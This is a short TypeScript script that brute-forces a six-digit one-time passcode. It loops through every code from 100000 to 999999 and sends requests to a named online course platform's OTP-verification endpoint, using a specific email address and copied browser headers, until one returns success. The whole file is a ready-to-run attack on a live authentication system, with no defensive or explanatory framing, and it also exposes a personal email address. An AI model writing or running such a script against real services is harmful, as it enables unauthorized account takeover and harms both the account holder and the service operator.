import axios from "axios"

let atteck=async(otp:Number)=> {
   try{
      let config = {
         method: 'get',
         maxBodyLength: Infinity,
         url: `https://harkiratapi.classx.co.in/get/otpverify?useremail=barathraj048%40gmail.com&otp=${otp}&mydeviceid=&mydeviceid2=`,
         headers: { 
           'accept': '*/*', 
           'accept-language': 'en-US,en;q=0.9', 
           'auth-key': 'appxapi', 
           'client-service': 'Appx', 
           'device-type': '', 
           'origin': 'https://harkirat.classx.co.in', 
           'priority': 'u=1, i', 
           'referer': 'https://harkirat.classx.co.in/', 
           'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"', 
           'sec-ch-ua-mobile': '?0', 
           'sec-ch-ua-platform': '"Windows"', 
           'sec-fetch-dest': 'empty', 
           'sec-fetch-mode': 'cors', 
           'sec-fetch-site': 'same-site', 
           'source': 'website', 
           'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
         }
       };
       
       let res=await axios.request(config)
      console.log(res.data)
      return res.status
   }catch(e){
      console.log(e)
   }
}


let bruteForce=async()=>{
   for(let i=100000;i<999999;i++){
      let status:any=await atteck(i)
      if(status==200){
         console.log("Success") 
         break
      }else{
         console.log("Failed")
         console.log(status,"am retrying"+i)
      }
   }
}
bruteForce()
console.log("im working")